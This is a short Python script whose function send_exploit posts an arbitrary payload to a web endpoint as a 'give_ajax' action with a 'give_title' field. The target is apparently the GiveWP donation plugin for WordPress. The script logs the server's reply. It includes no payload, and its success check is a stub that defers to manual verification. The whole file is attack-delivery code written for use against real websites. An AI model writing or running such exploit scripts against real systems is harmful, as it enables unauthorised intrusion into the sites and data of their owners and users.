import requests
import json
import logging


def send_exploit(url, payload):
    data = {
        'action': 'give_ajax',
        'give_title': payload
    }

    logging.info(f"Sending exploit to {url}")
    logging.debug(f"Payload: {payload}")

    try:
        response = requests.post(url, data=data, timeout=10)
        response.raise_for_status()

        logging.info("Exploit sent successfully.")

        try:
            json_response = response.json()
            logging.info("JSON Response:")
            logging.info(json.dumps(json_response, indent=4))
        except json.JSONDecodeError:
            logging.info("Non-JSON Response:")
            logging.info(response.text)

        verify_exploit_success(response)

    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send exploit: {str(e)}")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {str(e)}")


def verify_exploit_success(response):
    logging.warning("Exploit success verification not implemented.")
    logging.info("Please manually verify if the exploit was successful.")